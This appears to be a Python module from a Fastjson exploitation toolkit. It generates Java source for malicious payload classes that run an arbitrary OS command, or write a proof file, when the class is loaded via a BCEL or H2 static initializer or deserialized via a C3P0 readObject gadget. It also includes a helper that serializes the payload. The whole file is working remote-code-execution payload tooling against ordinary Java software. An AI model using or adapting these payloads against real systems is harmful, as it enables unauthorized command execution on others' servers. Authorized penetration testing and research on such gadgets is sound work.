"""预设恶意类源码：静态初始化（BCEL/H2）或 readObject（C3P0）。"""

from __future__ import annotations

from typing import Literal, Optional

from fastjson_toolkit.poc.echo.source import java_os_adaptive_exec, java_string_literal

PresetMode = Literal["touch", "exec"]

DEFAULT_STATIC_CLASS = "PresetPayload"
DEFAULT_SER_CLASS = "PresetSer"


def _clinit_body(
    *,
    mode: PresetMode,
    cmd: str,
    proof_path: Optional[str],
    proof_content: Optional[str],
) -> str:
    """生成 static {} / readObject 内共用的执行片段。"""
    parts: list[str] = []
    if mode == "touch" or proof_path:
        path = proof_path or "/tmp/fj_preset"
        content = proof_content if proof_content is not None else "FJ_PRESET"
        path_lit = java_string_literal(path)
        body_lit = java_string_literal(content)
        parts.append(
            f"""
            try {{
                java.nio.file.Path p = java.nio.file.Paths.get("{path_lit}");
                java.nio.file.Path parent = p.getParent();
                if (parent != null) {{
                    java.nio.file.Files.createDirectories(parent);
                }}
                String body = "{body_lit}-" + System.currentTimeMillis() + "\\n";
                java.nio.file.Files.write(p, body.getBytes(java.nio.charset.StandardCharsets.UTF_8));
            }} catch (Throwable ignored) {{
            }}"""
        )
    if mode == "exec":
        cmd_lit = java_string_literal(cmd or "id")
        exec_block = java_os_adaptive_exec(f'"{cmd_lit}"', indent="                ")
        parts.append(
            f"""
            try {{
{exec_block}
            }} catch (Throwable ignored) {{
            }}"""
        )
    return "\n".join(parts)


def build_static_payload_source(
    *,
    class_name: str = DEFAULT_STATIC_CLASS,
    mode: PresetMode = "exec",
    cmd: str = "id",
    proof_path: Optional[str] = None,
    proof_content: Optional[str] = None,
) -> str:
    """类加载即触发的预设类（BCEL ClassLoader / H2 defineClass）。"""
    cn = (class_name or DEFAULT_STATIC_CLASS).strip() or DEFAULT_STATIC_CLASS
    body = _clinit_body(
        mode=mode, cmd=cmd, proof_path=proof_path, proof_content=proof_content
    )
    return f"""\
public class {cn} {{
    static {{{body}
    }}
}}
"""


def build_serializable_payload_source(
    *,
    class_name: str = DEFAULT_SER_CLASS,
    mode: PresetMode = "exec",
    cmd: str = "id",
    proof_path: Optional[str] = None,
    proof_content: Optional[str] = None,
) -> str:
    """C3P0 HexAscii 二次反序列化：readObject 触发。"""
    cn = (class_name or DEFAULT_SER_CLASS).strip() or DEFAULT_SER_CLASS
    body = _clinit_body(
        mode=mode, cmd=cmd, proof_path=proof_path, proof_content=proof_content
    )
    return f"""\
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;

public class {cn} implements Serializable {{
    private static final long serialVersionUID = 1L;

    private void writeObject(ObjectOutputStream out) throws Exception {{
        out.defaultWriteObject();
    }}

    private void readObject(ObjectInputStream in) throws Exception {{
        in.defaultReadObject();{body}
    }}
}}
"""


def build_serialize_main_source(*, payload_class: str = DEFAULT_SER_CLASS) -> str:
    """临时 main：把 payload 实例写出 ObjectOutputStream。"""
    cn = (payload_class or DEFAULT_SER_CLASS).strip() or DEFAULT_SER_CLASS
    return f"""\
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;

public class SerializeMain {{
    public static void main(String[] args) throws Exception {{
        String out = args.length > 0 ? args[0] : "preset.ser";
        Object obj = new {cn}();
        try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(out))) {{
            oos.writeObject(obj);
        }}
    }}
}}
"""
